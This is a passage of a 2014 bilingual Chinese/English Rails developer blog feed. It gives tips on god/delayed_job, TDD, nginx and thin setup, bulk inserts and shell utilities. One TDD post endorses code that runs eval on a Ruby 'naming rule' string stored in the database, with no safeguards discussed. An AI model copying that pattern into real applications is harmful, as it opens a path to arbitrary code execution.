RAILS_ROOT = '/sg552/workspace/m-api-cache-cleaner'
God.watch do |w| 
  w.name = 'cache_cleaner'
  w.dir = RAILS_ROOT
  w.start = "cd #{RAILS_ROOT} &amp;amp;&amp;amp; RAILS_ENV=production bundle exec bin/delayed_job -n 5 start"
  w.stop = "cd #{RAILS_ROOT} &amp;amp;&amp;amp; RAILS_ENV=production bundle exec bin/delayed_job stop"
  w.restart = "cd #{RAILS_ROOT} &amp;amp;&amp;amp; RAILS_ENV=production bundle exec bin/delayed_job -n 5 restart"
  w.log = "#{RAILS_ROOT}/log/cache_cleaner_stdout.log"
  # 根据实际使用的效果，这个参数，god 是不会建立pid_file的
  # 因为 delayed_job -n 5 start 会生成自己的PID文件
  # 但是我们仍然要给它一个随便的值，这标志该任务是 “有自己的daemon“的任务
  w.pid_file = File.join(RAILS_ROOT, "log/delayed_job.total.pid")
  # 不需要为 delayed_job 指定这个参数。因为delayed_job有休眠时间。god会不断的唤醒它。。
  w.keepalive
end

&lt;/pre&gt;
&lt;p&gt;一点儿经验： 由于pid文件没有正常生成，所以 god不会实时监控，并且 keepalive对应的进程（也就是说，我把5个delayed_job 干掉一个之后， god不会自动的重启它） &amp;#160; &amp;#160; &amp;#160;( because the god "pid" file is omitted, &amp;#160;god won't keep an eye on the stopped process )&amp;#160;&lt;/p&gt;
&lt;p&gt;但是一个变通方法是: &amp;#160;(a workaround to keep alive delayed_job child-processes: )&amp;#160;&lt;/p&gt;
&lt;pre&gt;$ god restart cache_cleaner&lt;/pre&gt;

&lt;p&gt; 在god运行状态下，我们可以这样加载： &amp;#160;( we could load config file in run-time)&amp;#160;&lt;/p&gt;
&lt;pre&gt;$ god stop cache_cleaner
$ god remove cache_cleaner
$ god load /opt/app/path/cache_cleaner.god
$ god start cache_cleaner
$ god status
cache_cleaner: start &lt;/pre&gt;

&lt;p&gt; 现在可以看到， 5个delayed_job 都已经跑起来了： &amp;#160;( now we see all the 5 processes running)&amp;#160;&lt;/p&gt;
&lt;pre&gt;09:04 [root@a03.test.3g.b28.youku]$ ps -ef | grep delayed
root      3683 31684  0 08:54 pts/4    00:00:00 tail delayed_job.log -f
root      7842     1  4 09:04 ?        00:00:18 delayed_job.1                    
root      7843     1  4 09:04 ?        00:00:19 delayed_job.0                    
root      7872     1  5 09:04 ?        00:00:20 delayed_job.2                    
root      7940     1  5 09:05 ?        00:00:19 delayed_job.3                    
root      7956     1  5 09:05 ?        00:00:19 delayed_job.4      
&lt;/pre&gt;
</description>
      <pubDate>Tue, 13 May 2014 01:06:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/using-delayed-job-with-god</link>
    </item>
    <item>
      <title>同一个方法的不同声明形式( same method in different declarations ) </title>
      <description>&lt;p&gt;之前脑子里一直知道 TDD 会产生设计良好的代码。 但是一直没有落实到纸面上。今天早上遇到了同样的问题，所以现在赶紧记录下来。 ( all over the time, &amp;#160;I know that TDD give us "fine designed code". &amp;#160;however I haven't write my experience. This morning I had the chance and now write it down )&lt;/p&gt;
&lt;p&gt;假设我们有两个对象： TargetUrl , Plan &amp;#160; &amp;#160;( assuming we have 2 objects: )&lt;/p&gt;
&lt;pre&gt;class TargetUrl  
  belongs_to :plan
  attr_accessible :url
end

class Plan
  attr_accessible :naming_urls
end
&lt;/pre&gt;
&lt;p&gt;然后我们希望 在TargetUrl中有一个方法，可以根据当前的URL返回 一个file_name: ( and I need TargetUrl has a method: generate a file_name according to its 'url' )&amp;#160;&lt;/p&gt;
&lt;pre&gt;    url = "http://site.com/popup_page?foo=111&amp;amp;bar=222"
    @plan = Plan.create(:naming_rule =&amp;gt; '
      @file_name = "foo-#{@params[:foo]}-bar-#{@params[:bar]}"
    '
    @target_url = TargetUrl.create(:url =&amp;gt; url, :plan_id =&amp;gt; @plan.id)
&lt;/pre&gt;
&lt;p&gt;

于是，我发现自己在写代码的时候，写出了两个形式的代码： ( so I found that I wrote 2 declarations of this method)&amp;#160;&lt;/p&gt;
&lt;pre&gt;#  直接拿来就写：  （先写实现：)   ( form 1. implementation first , no TDD here) 
def generate_file_name_by_url   ( 这里没有参数）
    url = self.url
    naming_rule = self.plan.naming_url
    # ... other code
end
&lt;/pre&gt;
&lt;p&gt;
# 然后它难于测试（在测试之前，需要建立各种model, 想好它们的关系， 先建立plan, 再建立target_url 。而且在方法调用时不知道它使用了哪些变量（都深深的隐藏在instance 中） )，  ( then I found it hard to test: I need to setup all the related models and make a method call which is not so easy to see what variables it is using) &lt;/p&gt;

&lt;pre&gt;# 想了想， 觉得似乎这个方法可以写成一个通用的方法，改成这样：  ( so I change it to a ClassMethod) def TargetUrl.generate_file_name_by_url  url, naming_rule  
end

# 所以，老老实实的使用TDD 方式， ( in the TDD way: )
  # 先写测试：   (spec first) 
  before do
     #...
     url = "http://site.com/popup_page?foo=111&amp;amp;bar=222"
    @plan = Plan.create(:naming_rule =&amp;gt; '
      @file_name = "foo-#{@params[:foo]}-bar-#{@params[:bar]}"
    '
    @target_url = TargetUrl.create(:url =&amp;gt; url, :plan_id =&amp;gt; @plan.id)
    #... 
  end
  it 'should get_file_name_by_url' do
    file_name = TargetUrl.generate_file_name_by_url @target_url.url, @plan.naming_rule
    @params = Rack::Utils.parse_query(URI(@target_url.url).query).to_options
    file_name.should == "foo-#{@params[:foo]}-bar-#{@params[:bar]}"
  end

  # 再写实现，发现 class_method 形式是不合理的： ( then I found class method is not suitable here) 
  def TargetUrl.generate_file_name_by_url url, naming_rule
    @file_name = ...
    return @file_name
  end 
  # 于是改成 instance method: ( let's change it to instance method) 
  def generate_file_name_by_url url, naming_rule
    @file_name = ...
    return @file_name
  end   
&lt;/pre&gt;

&lt;p&gt; 于是现在的 unit test 和 implementation 分别是： ( so for now, the rspec and implementation are)&lt;/p&gt;
&lt;pre&gt;  it 'should get_file_name_by_url' do
    file_name = @target_url.generate_file_name_by_url @target_url.url, @plan.naming_rule
    # ... 
  end

class TargetUrl
  # ...
  def generate_file_name_by_url url, naming_rule
    @params = Rack::Utils.parse_query(URI(url).query).to_options
    @file_name = ''
    eval(naming_rule)
    return @file_name
  end 
end
&lt;/pre&gt;
&lt;p&gt;结论： 不要偷懒， TDD 永远可以让我们设计出最合适的实现方式。 &amp;#160;(conclusion: &amp;#160;don't be lazy. always TDD, which help us write better-designed code )&amp;#160;&lt;/p&gt;</description>
      <pubDate>Mon, 12 May 2014 02:11:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/same-method-in-different-declarations</link>
    </item>
    <item>
      <title>bulk insert/delete in Rails3/4 (Rails3/4中的批量删除）</title>
      <description>&lt;p&gt;批量删除： (bulk delete)&amp;#160;&lt;/p&gt;
&lt;pre&gt;# if a plan has 100K target_urls:   (如果一个plan 有 100K 个 target_urls ) 
# never use:   （绝对不要这样做） 
#@plan.target_urls.clear
# you should use: 
TargetUrl.delete_all(:plan_id =&amp;gt; @plan.id) 
&lt;/pre&gt;

&lt;p&gt;批量增加： &amp;#160;使用 gem: &lt;a href="https://github.com/zdennis/activerecord-import/wiki/Examples" target="_blank"&gt;activerecord-import &lt;/a&gt; &lt;/p&gt;
&lt;pre&gt;1. in Gem file: 
gem 'activerecord-import', '~&amp;gt; 0.5.0'

2. in controller:
   
    target_url_entities = []
    urls.each do |url_to_request|
      target_url_entities &amp;lt;&amp;lt; TargetUrl.new(:url =&amp;gt; url_to_request, :plan_id =&amp;gt; @plan.id)
    end 
    TargetUrl.import target_url_entities, :validate =&amp;gt; false
&lt;/pre&gt;
&lt;p&gt;refer to:  &lt;a href="https://github.com/zdennis/activerecord-import/wiki/Examples" target="_blank"&gt; https://github.com/zdennis/activerecord-import/wiki/Examples &lt;/a&gt;
&lt;/p&gt;
</description>
      <pubDate>Sun, 11 May 2014 07:58:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/bulk-insert-delete-in-rails</link>
    </item>
    <item>
      <title>UBUNTU下细微调节显示器亮度 （fine adjustment for Monitor in ubuntu ）</title>
      <description>&lt;p&gt;最近发现自己有需要微调显示器亮度的需求。因为在黑暗环境下，默认提供的亮度太亮了，我需要再暗点儿。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href="http://www.maketecheasier.com/configure-screen-brightness-in-ubuntu/" target="_blank"&gt;http://www.maketecheasier.com/configure-screen-brightness-in-ubuntu/&lt;/a&gt;
&lt;/p&gt;&lt;p&gt;1. $&amp;#160;sudo apt-get install xbacklight&lt;/p&gt;
&lt;p&gt;2. $&amp;#160;xbacklight -set 40 &amp;#160;(40% brightness)&amp;#160;&lt;/p&gt;</description>
      <pubDate>Sat, 10 May 2014 23:57:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/adjust-brightness-in-ubuntu</link>
    </item>
    <item>
      <title>优先使用接口，还是优先复制代码?  (coupling? v.s. copying )</title>
      <description>&lt;p&gt;今天遇到个问题： &amp;#160;( today I met a problem: --- exactly, yesterday.)&lt;/p&gt;
&lt;p&gt;有两个子系统： A ， B。 &amp;#160;我希望在A中使用B的一个既有的功能。 B中的这个功能，以接口的形式提供。 &amp;#160;( I have 2 systems: A and B. I want A has a function that B already implemented as a HTTP interface)&amp;#160;&lt;/p&gt;
&lt;p&gt;A 和B共用一个数据库（也就是说，A可以直接读取B的数据） ( A and B share a same database )&amp;#160;&lt;/p&gt;
&lt;p&gt;问题： 是应该让A通过 http 直接访问B的接口， 还是把B的代码复制到A中，让A直接调用？ &amp;#160;( my question is: how to choose? (1) let A visit B's http interface &amp;#160;(2) copy B's code to A. )&lt;/p&gt;
&lt;p&gt;答案： (my final solution)&amp;#160;&lt;/p&gt;
&lt;p&gt;最理想的情况下，如果B系统永远稳定运行，接口永远不变，那么必然使用第一种办法。 ( if B is promised to run 24x7 , and its interface will never change, let's choose option(1) )&amp;#160;&lt;/p&gt;
&lt;p&gt;但是实际情况是：B的接口不稳定，可能会当机， 为了让A自己保持稳定(与B系统解藕），所以我的选择是在B中做个重构，把代码逻辑放到 client.rb文件中，然后把这个client.rb文件复制到A中，这样A就可以直接使用这个文件了。（更合适的办法，是把client.rb这个文件 做成一个gem, 这样A和B的代码就可以做到同步了） (but in the real world, B's interface is not stable at all, it may changes, it may get down. To make sure A is decoupled from B, I firstly did some &amp;#160;refactoring(move method from controller to model) , then copied B's model to A. (they have the same infrastructure, so the model code could be reused without any modification) &amp;#160;Now A has the same code with B) &amp;#160;--- and another thing, if I could make that duplicated-code a rubygem, then things will be perfect. ) &amp;#160;&lt;/p&gt;
&lt;p&gt;结论： 思路不能教条，要根据实际情况选择最合适的 办法。 &amp;#160;( conclusion: &amp;#160;there's no silver bullet, let's choose the best approach by the real situation. )&amp;#160;&lt;/p&gt;</description>
      <pubDate>Sat, 10 May 2014 23:45:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/coupling-vs-copying</link>
    </item>
    <item>
      <title>config/routes.rb中，root路径要放在下面，否则会引起分页链接错误 (root path with karminari) </title>
      <description>&lt;p&gt; 今天很奇怪，遇到一个问题： kaminari 在分页时 ，如果 被分页内容是 root_path, 那么在分页helper中的路径，
就不是完整的。形式（例如  /client/pids?page=2 ) ，而是以 '/？page=2'  这样的形式显示。 ( today I met a problem caused by a root_path declaration in the top of my routes.rb file . &amp;#160;the problem is : the links in pagination helper is not displayed as standard path, but a root path)&amp;#160;&lt;/p&gt; 

&lt;p&gt; 解决办法： 把 config/routes.rb中的 root声明放在 下面 ( the solution is: simply put the 'root' declaration to the bottom of the page)&amp;#160;&lt;/p&gt; 
&lt;pre&gt;# in config/routes.rb  
-  root :to =&amp;gt; 'client/pids#index'
+  #root :to =&amp;gt; 'client/pids#index'
   match '/logout' =&amp;gt; "users#logout", :as =&amp;gt; :logout
   namespace "client" do
     resources "vendors", "pids", "os", "pid_logs",
     ......
     end
   end
 
+  root :to =&amp;gt; 'users#index'

&lt;/pre&gt;</description>
      <pubDate>Sat, 10 May 2014 02:49:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/root-path-with-kaminari</link>
    </item>
    <item>
      <title>rails 3.0 压缩 javascript 和 css ( compress css/js in rails 3.0- )</title>
      <description>&lt;p&gt;压缩 javascript 和 css &amp;#160;&lt;br /&gt;参考 (refer to )： &lt;a href="http://stackoverflow.com/questions/7112218/how-to-install-a-plugin-in-rails-3-getting-a-commands-is-not-a-module-typeerro/23507780#23507780"&gt;http://stackoverflow.com/questions/7112218/how-to-install-a-plugin-in-rails-3-getting-a-commands-is-not-a-module-typeerro/23507780#23507780&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;1. 编辑  Rakefile: &amp;#160; (edit Rakefile)&amp;#160;&lt;/p&gt;
&lt;p&gt;require File.expand_path('../config/application', __FILE__)&lt;/span&gt;
&lt;br /&gt;  require 'rake'&lt;/p&gt;
&lt;p&gt;# 增加这一行，注意位置。 &amp;#160;( add this line of code)&amp;#160;&lt;/span&gt;
&lt;br /&gt;  include Rake::DSL&amp;#160;&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;2.编辑： script/rails: &amp;#160;&lt;br /&gt;  APP_PATH = File.expand_path('../../config/application',  __FILE__)&lt;br /&gt;  require File.expand_path('../../config/boot',  __FILE__)&lt;br /&gt;  # 增加这一行，注意位置。 &amp;#160;(add this line of code)&amp;#160;&lt;br /&gt;  module Commands; end&lt;br /&gt;  require 'rails/commands'&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;3.then run this command:&lt;/p&gt;
&lt;p&gt;  $ bundle exec rails plugin install git://github.com/sbecker/asset_packager.git&lt;br /&gt;

&lt;/p&gt;
&lt;p&gt;4. 编辑： 新增一个 yml 文件， 把你用到的JS， CSS文件放到里面去： $ cat config/asset_packages.yml &amp;#160;( create a yml file as below)&amp;#160;&lt;/p&gt;
&lt;pre&gt;---
javascripts:
- base:
  - jquery-1.9.1.min
  - bootstrap.min
  - jquery-migrate-1.1.1
  - jquery-ui-1.10.1.custom.min
  - jquery-ujs-for-jquery-1.9
  - jquery.treeview
  - jquery.toastmessage
  - jquery.tooltip
  - jquery-autocomplete-combobox
  - jquery.uploadify
  - jquery-ui-timepicker-addon
  - jquery.ui.datepicker-zh-CN
  - select2
  - select2_locale_zh-CN
  - global
  - jquery.tagit
  - jquery.validate
  - jqueryui-editable
  - jquery.ui.widget

stylesheets:
- base:
  - style
  - invalid
  - reset
  - jquery.treeview
  - jquery-ui-1.10.1.custom
  - jquery.toastmessage
  - jquery-autocomplete-combobox
  - uploadify
  - select2
  - jquery.tagit
  - jquery.validate
  - cms
  - jqueryui-editable
  - bootstrap.min
  - customized_bootstrap
&lt;/pre&gt;
&lt;p&gt;

5. 在 布局文件(origin.html.erb)中： ( in your layout file)&amp;#160;&lt;/p&gt;
&lt;pre&gt;&amp;lt;%= raw stylesheet_link_merged :base %&amp;gt;
&amp;lt;%= raw javascript_include_merged :base %&amp;gt;
&lt;/pre&gt;
&lt;p&gt;
就可以了。 (done)&amp;#160;&lt;/p&gt;
&lt;p&gt;更多，见： &amp;#160;(refer to ) https://github.com/sbecker/asset_packager&lt;/p&gt;</description>
      <pubDate>Wed, 07 May 2014 05:27:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/compress-css-and-js-in-rails3-without-asset-pipeline</link>
    </item>
    <item>
      <title>RAILS 3.0.x 安装plugin :  install rails plugin for rails 3.0.x ( Commands is not a module (TypeError) )</title>
      <description>&lt;p&gt;今天在安装 rails 3.0.x 的plugin 时发现问题： &amp;#160; ( I met a problem when installing plugin for rails 3.0.x project)&amp;#160;&lt;/p&gt;
&lt;p&gt;Commands is not a module (TypeError)&lt;/p&gt;
&lt;p&gt;搜索了一下，这个是rake的BUG。 &amp;#160;解决方法如下： &amp;#160;( it seems it's a bug of Rake )&amp;#160;&lt;/p&gt;

&lt;pre&gt;1. 编辑  Rakefile: 
  require File.expand_path('../config/application', __FILE__)
  require 'rake'
  # 增加这一行，注意位置。
  include Rake::DSL 
2.编辑： script/rails: 
  APP_PATH = File.expand_path('../../config/application',  __FILE__)
  require File.expand_path('../../config/boot',  __FILE__)
  # 增加这一行，注意位置。
  module Commands; end
  require 'rails/commands'
3.then run this command:
  $ bundle exec rails plugin install git://github.com/sbecker/asset_packager.git
&lt;/pre&gt;
&lt;p&gt;
refer to:&amp;#160;&lt;a href="http://stackoverflow.com/a/23507780/445908" title="http://stackoverflow.com/a/23507780/445908" target="_blank"&gt;http://stackoverflow.com/a/23507780/445908&lt;/a&gt;
&lt;/p&gt;</description>
      <pubDate>Wed, 07 May 2014 02:42:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/install-rails3-plugin</link>
    </item>
    <item>
      <title>在nginx转发时保留原始域名( keep the Host header via nginx proxy_pass  )</title>
      <description>&lt;p&gt;最近的子项目越来越多，但是只有一个域名， 在做了nginx的跳转之后， 发现原来的域名会丢失，取代出现的是IP。&lt;/p&gt;
&lt;p&gt;(with the growth of the sub-systems of my current project, there is a problem occurred: the origin domain name disappeared and it is replaced by the ip addresses , which is not liked by my workmates. &amp;#160;)&amp;#160;&lt;/p&gt;
&lt;p&gt;所以我们要保留原始域名，这货也叫 Host header. &amp;#160;（so the solution is to keep the origin domain name . aka host Header. &amp;#160;）&lt;/p&gt;

&lt;p&gt; solution is : proxy_set_header Host $http_host;  &lt;/p&gt;
&lt;pre&gt;    server {
        listen 80; 
        # this is the key !!!!! 
        proxy_set_header Host $host;
        location /client/pids {
            proxy_pass http://10.103.13.103:3200/client/pids;
        }
        location /interface/client/pids {
            proxy_pass http://10.103.13.103:3200/interface/client/pids;
        }
        ......
&lt;/pre&gt;
&lt;p&gt; refer to: &lt;a href="https://www.simplicidade.org/notes/archives/2011/02/nginx_proxy_host_header.html" target="_blank"&gt;https://www.simplicidade.org/notes/archives/2011/02/nginx_proxy_host_header.html&lt;/a&gt; and 
&lt;a href="http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_set_header" target="_blank"&gt;http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_set_header&lt;/a&gt; &lt;/p&gt;</description>
      <pubDate>Wed, 07 May 2014 01:41:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/keep_host_header_via_nginx_proxy_pass</link>
    </item>
    <item>
      <title>uncompress a tar.gz2 file</title>
      <description>&lt;p&gt;Installing VIM 7.3 steps:&lt;/p&gt;
&lt;pre&gt;$ wget ftp://ftp.vim.org/pub/vim/unix/vim-7.3.tar.bz2
$ bunzip2 vim-7.3.tar.bz2
$ tar xvf vim-7.3.tar
&lt;/pre&gt;
&lt;p&gt;so easy.&amp;#160;&lt;/p&gt;</description>
      <pubDate>Mon, 05 May 2014 06:26:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/uncompress-tar-gz2-file</link>
    </item>
    <item>
      <title>jQuery.shorten 一个非常不错的折叠长文本的插件。</title>
      <description>&lt;p&gt;How to toggle a long text using jQuery?  &lt;a href="https://github.com/viralpatel/jquery.shorten"&gt;jquery.shorten &lt;/a&gt;
&lt;/p&gt;

refer to: &lt;a target="_blank" href="http://stackoverflow.com/questions/5270227/how-to-hide-show-more-text-within-a-certain-length-like-youtube"&gt;http://stackoverflow.com/questions/5270227/how-to-hide-show-more-text-within-a-certain-length-like-youtube&lt;/a&gt;

&lt;pre&gt;&amp;lt;div&amp;gt;
   very very very long texttttttttttttttttttttttttt.....
&amp;lt;/div&amp;gt;

$(element).shorten()
&lt;/pre&gt;

&lt;img src="https://camo.githubusercontent.com/8bd6f34416a2976f7dabf68c40d699eb0f73a9b0/687474703a2f2f696d672e766972616c706174656c2e6e65742f323031302f31322f73686f772d6d6f72652d6c696e6b2e706e67" /&gt;</description>
      <pubDate>Wed, 30 Apr 2014 05:46:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/jquery-shorten</link>
    </item>
    <item>
      <title>from Rails3 to Rails4, set_table_name, set_primary_key is deprecated.</title>
      <description>&lt;p&gt;RAILS3的两个方法在RAILS4 中用不了： &amp;#160;set_table_name, set_primary_key.&amp;#160;&lt;/p&gt;
&lt;p&gt;we should use #table_name =  instead of #set_table_name. &amp;#160;&amp;#160;&lt;/p&gt;
&lt;p&gt; otherwise you will get undefined method `set_primary_key' for #&amp;lt;Class:0x37132e0&amp;gt; &lt;/p&gt;

&lt;pre&gt; class CmsClientPid &amp;lt; CmsActiveRecord
-  set_table_name "cms_client"
-  set_primary_key :pid
+  self.table_name = "cms_client"
+  self.primary_key = 'pid'
&lt;/pre&gt;
&lt;p&gt;refer to: &lt;a target="_blank" href="http://stackoverflow.com/questions/20386636/rails-set-primary-key-error"&gt;http://stackoverflow.com/questions/20386636/rails-set-primary-key-error&lt;/a&gt;
&lt;/p&gt;</description>
      <pubDate>Tue, 29 Apr 2014 06:58:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/set-table-name-is-deprecated-in-rails4</link>
    </item>
    <item>
      <title>调试RAILS程序的经验 ( experience of debugging rails)</title>
      <description>&lt;p&gt;1. 看日志。&amp;#160; &lt;br /&gt;1.1 日志的格式很重要，务必要有时间戳。有exception traceback, 有 Completed 时间&lt;br /&gt;&lt;br /&gt;1.2 rails log跟 stdout put 有时候会分别写到两个不同的文件当中。 如果rails log 没有信息，那么就要看 stdoutput 的信息（如果你用的是thin服务器的话，就要看 thin.yml 中的配置了)&amp;#160; 我们的经验是: libv8引起的错误，会直接打到 stdoutput 中。&lt;br /&gt;&lt;br /&gt;1.3 看nginx 日志。 当并发访问量特别大的时候（1000 req/s ） 这个时候看rails 日志是不报错的， 但是速度很慢。 nginx access日志就能看到些端倪。&amp;#160; &lt;br /&gt;&lt;br /&gt;1.4 看top.&amp;#160; 如果发现在 并发访问量特别大的时候， rails 进程的CPU 占用率特别高，就要小心了。赶紧静态化，或者使用缓存～&lt;br /&gt;&lt;br /&gt;1.5 使用grep, 例如： $ grep 'FATAL' &amp;lt;your_rails_log&amp;gt;. 就会看到所有出错的地方。&lt;/p&gt;
&lt;p&gt;2. 发现问题根源找到了，需要重启RAILS。否则很多僵死的进程会一直占用资源。&lt;/p&gt;</description>
      <pubDate>Fri, 25 Apr 2014 02:09:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/experience-of-debugging-rails</link>
    </item>
    <item>
      <title>使用 goaccess分析nginx日志（analyze Nginx log using GoAccess)</title>
      <description>&lt;p&gt;nginx 日志无法用rails-request-analyzer 来分析。 需要使用 goaccess 。 因为前者一分析就死机，后者速度更快，分析1.2G的日志大约20秒。 ( if you want to analyze nginx log, use GoAccess)&lt;/p&gt;
&lt;p&gt;用法非常简单： &amp;#160;(quite simple to use)&amp;#160;&lt;/p&gt;

&lt;pre&gt;$ goaccess -f &amp;lt;your_log_file&amp;gt; -a &amp;gt; result.html
&lt;/pre&gt;
&lt;p&gt;但是goaccess的一个缺点是： &amp;#160;分析大日志时，如果你的机器内存太小，就会报错退出。例如，你的机器是4G内存，但是要分析的内容是7G大小，这时候就会 在机器运行2，3分钟，接近死机是，出现 Killed 的结果（还好GoAccess会自动 干掉这个进程 ) &amp;#160;( but it's a weakpoint that goaccess can't analyze big file, e.g. 7G size. &amp;#160;)&amp;#160;&lt;/p&gt;
&lt;p&gt;所以解决办法是： 1. 把大日志切成小文件。 &amp;#160;2. 分析小文件。&lt;/p&gt;
&lt;p&gt;$ split -b 2G &amp;lt;your_log_file&amp;gt;&lt;/p&gt;
&lt;p&gt;$&amp;#160;&lt;/p&gt;</description>
      <pubDate>Mon, 14 Apr 2014 01:41:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/analyze-nginx-log-using-goaccess</link>
    </item>
    <item>
      <title>OCR online for chinese(可以在线识别文字的服务）</title>
      <description>&lt;p&gt;这个东西真的很好用，google一下出来一堆，随便找了一个： &lt;a href="http://www.newocr.com/" target="_blank"&gt;http://www.newocr.com/&lt;/a&gt;&amp;#160; &amp;#160; ( there're many services for OCR online)&lt;/p&gt;
&lt;p&gt;用起来非常简单： ( quite simple to use: )&lt;/p&gt;
&lt;p&gt;1. 上传图片 &amp;#160;( upload an image containing the characters )&lt;/p&gt;
&lt;p&gt;2. 点击 ORC按钮 &amp;#160;( click the orc button)&amp;#160;&lt;/p&gt;
&lt;p&gt;3. 出现识别结果。 &amp;#160;( show the results)&amp;#160;&lt;/p&gt;
&lt;p&gt;准确率稍差，大约60% ～70%吧，但是比手敲的感觉好多了～ &amp;#160;(thought it's only 60%~70% rate of correct result, but it's good enough for me )&lt;/p&gt;</description>
      <pubDate>Thu, 10 Apr 2014 01:09:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/ocr-online-for-chinese</link>
    </item>
    <item>
      <title>使用 god + delayed_job是，不要使用 god的 keep_alive选项 ( don't use god's keep alive option when using god controlling delayed_jobs) </title>
      <description>&lt;p&gt;因为delayed_job有休眠时间。god会不断的唤醒它。。&lt;/p&gt;

&lt;p&gt;God is always trying to start delayed_job every 5 seconds by default: &lt;/p&gt;
&lt;p&gt; God's log file: &lt;/p&gt;
&lt;pre&gt; 23 ERROR: there is already one or more instance(s) of the program running
 24 ERROR: there is already one or more instance(s) of the program running
 25 ERROR: there is already one or more instance(s) of the program running
 26 ERROR: there is already one or more instance(s) of the program running
 27 ERROR: there is already one or more instance(s) of the program running
 28 ERROR: there is already one or more instance(s) of the program running
 29 ERROR: there is already one or more instance(s) of the program running
 30 ERROR: there is already one or more instance(s) of the program running
&lt;/pre&gt;

&lt;p&gt;so the solution is simply don't use "keepalive=true" option.
&lt;/p&gt;
&lt;pre&gt;RAILS_ROOT = '/sg552/workspace/m-api-cache-cleaner'
God.watch do |w| 
  w.name = 'cache_cleaner'
  w.dir = RAILS_ROOT
  w.start = "bundle exec bin/delayed_job start"
  w.log = "#{RAILS_ROOT}/log/cache_cleaner_stdout.log"
  # 不需要为 delayed_job 指定这个参数。因为delayed_job有休眠时间。god会不断的唤醒它。。
#  w.keepalive
end
&lt;/pre&gt;</description>
      <pubDate>Thu, 03 Apr 2014 00:59:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/do-not-using-keepalive-option-when-using-god-controlling-delayed-jobs</link>
    </item>
    <item>
      <title>设置 rails 使用中国大陆时间（set Rails using Beijing Time)</title>
      <description>insert "    config.time_zone = 'Asia/Harbin'" into your config/application.rb

&lt;pre&gt;# config/application.rb
module MCacheCleaner
  class Application &amp;lt; Rails::Application
    config.time_zone = 'Asia/Harbin'
  end 
end
&lt;/pre&gt;</description>
      <pubDate>Thu, 03 Apr 2014 00:38:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/set-rails-using-beijing-time</link>
    </item>
    <item>
      <title>使用 nginx + thin 的配置启动 rails server. ( using nginx + thin to serve rails app) </title>
      <description>&lt;p&gt;1.  nginx 中做如下配置：
&lt;/p&gt;
&lt;pre&gt;     server {
         listen 80;
         charset utf-8;
         location / {
             proxy_pass          http://rails_servers;
             proxy_redirect      default;
             proxy_set_header    X-Forwarded-For $proxy_add_x_forwarded_for;
             proxy_set_header    X-Real-IP $remote_addr;
             proxy_set_header    Host $http_host;
             proxy_next_upstream http_502 http_504 error timeout invalid_header;
        }
     }
     upstream rails_servers{
            server 127.0.0.1:6661;
            server 127.0.0.1:6662;
            server 127.0.0.1:6663;
            server 127.0.0.1:6664;
     }
&lt;/pre&gt;

重启 nginx:  
&lt;pre&gt;  $ nginx -t  （测试一下配置文件）
  $ nginx -s reload
&lt;/pre&gt;

&lt;p&gt;2. 使用 配置文件来启动 thin: &lt;/p&gt;
&lt;p&gt;    2.1. 建立 &lt;rails.folder&gt;/config/thin.yml  , 内容如下： &lt;/rails.folder&gt;&lt;/p&gt;
&lt;pre&gt;---
chdir: '/opt/app/ruby/m-cms-for-tudou/current'  #  这里需要修改。
environment: production
address: 0.0.0.0
port: 6661
timeout: 30
log: log/thin.log
pid: tmp/pids/thin.pid
max_conns: 1024
max_persistent_conns: 512
require: []
wait: 30
servers: 4
daemonize: true
&lt;/pre&gt;
&lt;p&gt;    2.2. 启动thin:  (记得Gemfile  中要有  gem  'thin'  ) &lt;/p&gt;
&lt;pre&gt;    $ bundle exec thin start -C config/thin.yml
&lt;/pre&gt;

&lt;p&gt;    2.3. 记得在 config/environments/production.rb文件中：  (以后可以使用nginx来 配置，处理静态文件。现在先这样弄着） &lt;/p&gt;
&lt;pre&gt;Cms::Application.configure do
    config.serve_static_assets = true
end
&lt;/pre&gt;
就可以了。</description>
      <pubDate>Tue, 01 Apr 2014 01:18:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/nginx-and-thin-to-server-rails-app</link>
    </item>
    <item>
      <title>使用 gzip 来压缩文件 (using gzip to compress file)</title>
      <description>&lt;p&gt;非常简单。 &amp;#160;&amp;#160;&lt;/p&gt;
&lt;p&gt;$ gzip &amp;lt;target_file&amp;gt; 就可以了。关键是 目标文件会被删掉。生成个新的.gz文件。 &amp;#160;( remember: the original file will be replaced by a newly generated .gz file )&amp;#160;&lt;/p&gt;
&lt;p&gt;如果想保留源文件的话，就可以使用 --stdout &amp;#160; ( use --stdout to keep the original file)&amp;#160;&lt;/p&gt;
&lt;p&gt;$ gzip &amp;lt;target_file&amp;gt; &amp;#160;--stdout &amp;gt; log.gz &amp;#160;&lt;/p&gt;</description>
      <pubDate>Tue, 01 Apr 2014 00:42:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/using-gzip-to-compress-file</link>
    </item>
    <item>
      <title>deleting files in rsync ( rsync 中的delete)</title>
      <description>&lt;p&gt;最近要使用rsync 来同步接近大小1G，总共50W个的文件。由于需要保证服务器上一直有对应的文件存在，  &lt;a href="http://weibo.com/PrincipalArchitect"&gt;
